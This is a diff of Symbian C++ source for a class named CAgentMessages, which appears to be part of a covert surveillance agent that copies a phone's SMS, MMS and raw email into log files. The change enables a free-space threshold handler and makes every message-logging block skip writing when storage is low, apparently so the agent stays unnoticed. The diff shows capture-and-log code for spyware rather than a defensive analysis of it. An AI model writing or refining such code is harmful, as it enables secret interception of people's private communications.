@@ -300,31 +300,25 @@ void CAgentMessages::StopAgentCmdL()
 
 void CAgentMessages::NotifyAgentCmdL(TUint32 aData)
 	{
-	//NB: if you want to implement freespace quota check:
-			//1. uncomment this
-			//2. add code for checking iBelowFreespaceQuota before writing log
-			//3. pay attention to timestamps into markup file
-			/*
-			TInt notifyType = aData & 0x000000ff;
-			switch(notifyType)
+	TInt notifyType = aData & 0x000000ff;
+	switch(notifyType)
+		{
+		case ENotifyThreshold:
+			{
+			TInt value = (aData & 0x0000ff00) >> 8;
+			if (value == EBelow)
 				{
-				case ENotifyThreshold:
-					{
-					TInt value = (aData & 0x0000ff00) >> 8;
-					if (value == EBelow)
-						{
-						iBelowFreespaceQuota = ETrue;
-						}
-					else
-						{
-						iBelowFreespaceQuota = EFalse;
-						}
-					}
-					break;
-				default:
-					break;
+				iBelowFreespaceQuota = ETrue;
 				}
-				*/
+			else
+				{
+				iBelowFreespaceQuota = EFalse;
+				}
+			}
+			break;
+		default:
+			break;
+		}
 	}
 
 
@@ -953,12 +947,14 @@ void CAgentMessages::DoOneRoundL()
 				buf.CleanupClosePushL();
 				if (buf.Length() > 0)
 				{
-					//__FLOG_HEXDUMP(buf.Ptr(), buf.Length());
-					CLogFile* logFile = CLogFile::NewLC(iFs);
-					logFile->CreateLogL(LOGTYPE_SMS);
-					logFile->AppendLogL(buf);
-					logFile->CloseLogL();
-					CleanupStack::PopAndDestroy(logFile);
+					if(!iBelowFreespaceQuota)
+						{
+						CLogFile* logFile = CLogFile::NewLC(iFs);
+						logFile->CreateLogL(LOGTYPE_SMS);
+						logFile->AppendLogL(buf);
+						logFile->CloseLogL();
+						CleanupStack::PopAndDestroy(logFile);
+						}
 				}
 				CleanupStack::PopAndDestroy(&buf);
 			}
@@ -972,12 +968,14 @@ void CAgentMessages::DoOneRoundL()
 				buf.CleanupClosePushL();
 				if (buf.Length() > 0)
 				{
-					//__FLOG_HEXDUMP(buf.Ptr(), buf.Length());
-					CLogFile* logFile = CLogFile::NewLC(iFs);
-					logFile->CreateLogL(LOGTYPE_MMS);
-					logFile->AppendLogL(buf);
-					logFile->CloseLogL();
-					CleanupStack::PopAndDestroy(logFile);
+					if(!iBelowFreespaceQuota)
+						{
+						CLogFile* logFile = CLogFile::NewLC(iFs);
+						logFile->CreateLogL(LOGTYPE_MMS);
+						logFile->AppendLogL(buf);
+						logFile->CloseLogL();
+						CleanupStack::PopAndDestroy(logFile);
+						}
 				}
 				CleanupStack::PopAndDestroy(&buf);
 			}
@@ -991,13 +989,15 @@ void CAgentMessages::DoOneRoundL()
 				buf.CleanupClosePushL();
 				if (buf.Length() > 0)
 				{
-					//__FLOG_HEXDUMP(buf.Ptr(), buf.Length());
-					CLogFile* logFile = CLogFile::NewLC(iFs);
-					//logFile->CreateLogL(LOGTYPE_MAIL);
-					logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
-					logFile->AppendLogL(buf);
-					logFile->CloseLogL();
-					CleanupStack::PopAndDestroy(logFile);
+					if(!iBelowFreespaceQuota)
+						{
+						CLogFile* logFile = CLogFile::NewLC(iFs);
+						//logFile->CreateLogL(LOGTYPE_MAIL);
+						logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
+						logFile->AppendLogL(buf);
+						logFile->CloseLogL();
+						CleanupStack::PopAndDestroy(logFile);
+						}
 				}
 				CleanupStack::PopAndDestroy(&buf);
 			}
@@ -1087,12 +1087,15 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 						buf.CleanupClosePushL();
 						if (buf.Length() > 0)
 						{
-							CLogFile* logFile = CLogFile::NewLC(iFs);
-							logFile->CreateLogL(LOGTYPE_SMS);
-							logFile->AppendLogL(buf);
-							logFile->CloseLogL();
-							CleanupStack::PopAndDestroy(logFile);
-							writeMarkup = ETrue;
+							if(!iBelowFreespaceQuota)
+								{
+								CLogFile* logFile = CLogFile::NewLC(iFs);
+								logFile->CreateLogL(LOGTYPE_SMS);
+								logFile->AppendLogL(buf);
+								logFile->CloseLogL();
+								CleanupStack::PopAndDestroy(logFile);
+								writeMarkup = ETrue;
+								}
 						}
 						CleanupStack::PopAndDestroy(&buf);
 					}
@@ -1106,12 +1109,15 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 							buf.CleanupClosePushL();
 							if (buf.Length() > 0)
 							{
-								CLogFile* logFile = CLogFile::NewLC(iFs);
-								logFile->CreateLogL(LOGTYPE_MMS);
-								logFile->AppendLogL(buf);
-								logFile->CloseLogL();
-								CleanupStack::PopAndDestroy(logFile);
-								writeMarkup = ETrue;
+								if(!iBelowFreespaceQuota)
+									{
+									CLogFile* logFile = CLogFile::NewLC(iFs);
+									logFile->CreateLogL(LOGTYPE_MMS);
+									logFile->AppendLogL(buf);
+									logFile->CloseLogL();
+									CleanupStack::PopAndDestroy(logFile);
+									writeMarkup = ETrue;
+									}
 							}
 							CleanupStack::PopAndDestroy(&buf);
 						}
@@ -1125,12 +1131,15 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 							buf.CleanupClosePushL();
 							if (buf.Length() > 0)
 							{
-								CLogFile* logFile = CLogFile::NewLC(iFs);
-								logFile->CreateLogL(LOGTYPE_MAIL);
-								logFile->AppendLogL(buf);
-								logFile->CloseLogL();
-								CleanupStack::PopAndDestroy(logFile);
-								writeMarkup = ETrue;
+								if(!iBelowFreespaceQuota)
+									{
+									CLogFile* logFile = CLogFile::NewLC(iFs);
+									logFile->CreateLogL(LOGTYPE_MAIL);
+									logFile->AppendLogL(buf);
+									logFile->CloseLogL();
+									CleanupStack::PopAndDestroy(logFile);
+									writeMarkup = ETrue;
+									}
 							}
 							CleanupStack::PopAndDestroy(&buf);
 						}
@@ -1177,12 +1186,15 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 						buf.CleanupClosePushL();
 						if (buf.Length() > 0)
 						{
-							CLogFile* logFile = CLogFile::NewLC(iFs);
-							logFile->CreateLogL(LOGTYPE_SMS);
-							logFile->AppendLogL(buf);
-							logFile->CloseLogL();
-							CleanupStack::PopAndDestroy(logFile);
-							writeMarkup = ETrue;
+							if(!iBelowFreespaceQuota)
+								{
+								CLogFile* logFile = CLogFile::NewLC(iFs);
+								logFile->CreateLogL(LOGTYPE_SMS);
+								logFile->AppendLogL(buf);
+								logFile->CloseLogL();
+								CleanupStack::PopAndDestroy(logFile);
+								writeMarkup = ETrue;
+								}
 						}
 						CleanupStack::PopAndDestroy(&buf);
 					}
@@ -1196,12 +1208,15 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 						buf.CleanupClosePushL();
 						if (buf.Length() > 0)
 						{
-							CLogFile* logFile = CLogFile::NewLC(iFs);
-							logFile->CreateLogL(LOGTYPE_MMS);
-							logFile->AppendLogL(buf);
-							logFile->CloseLogL();
-							CleanupStack::PopAndDestroy(logFile);
-							writeMarkup = ETrue;
+							if(!iBelowFreespaceQuota)
+								{
+								CLogFile* logFile = CLogFile::NewLC(iFs);
+								logFile->CreateLogL(LOGTYPE_MMS);
+								logFile->AppendLogL(buf);
+								logFile->CloseLogL();
+								CleanupStack::PopAndDestroy(logFile);
+								writeMarkup = ETrue;
+								}
 						}
 						CleanupStack::PopAndDestroy(&buf);
 					}
@@ -1215,12 +1230,15 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 						buf.CleanupClosePushL();
 						if (buf.Length() > 0)
 						{
-							CLogFile* logFile = CLogFile::NewLC(iFs);
-							logFile->CreateLogL(LOGTYPE_MAIL);
-							logFile->AppendLogL(buf);
-							logFile->CloseLogL();
-							CleanupStack::PopAndDestroy(logFile);
-							writeMarkup = ETrue;
+							if(!iBelowFreespaceQuota)
+								{
+								CLogFile* logFile = CLogFile::NewLC(iFs);
+								logFile->CreateLogL(LOGTYPE_MAIL);
+								logFile->AppendLogL(buf);
+								logFile->CloseLogL();
+								CleanupStack::PopAndDestroy(logFile);
+								writeMarkup = ETrue;
+								}
 						}
 						CleanupStack::PopAndDestroy(&buf);
 					}
@@ -1248,20 +1266,6 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 		}
 	}
 
-/*
-TInt64 CAgentMessages::GetFiletime(TTime& aCurrentUtcTime){
-	
-	_LIT(KInitialTime,"16010000:000000");
-	TTime initialTime;
-	initialTime.Set(KInitialTime);
-		
-	TTimeIntervalMicroSeconds interval;
-	interval=aCurrentUtcTime.MicroSecondsFrom(initialTime);
-		
-	return interval.Int64()*10; 
-		
-}
-*/
 
 HBufC8* CAgentMessages::GetMarkupBufferL(const TMarkup aMarkup)
 {
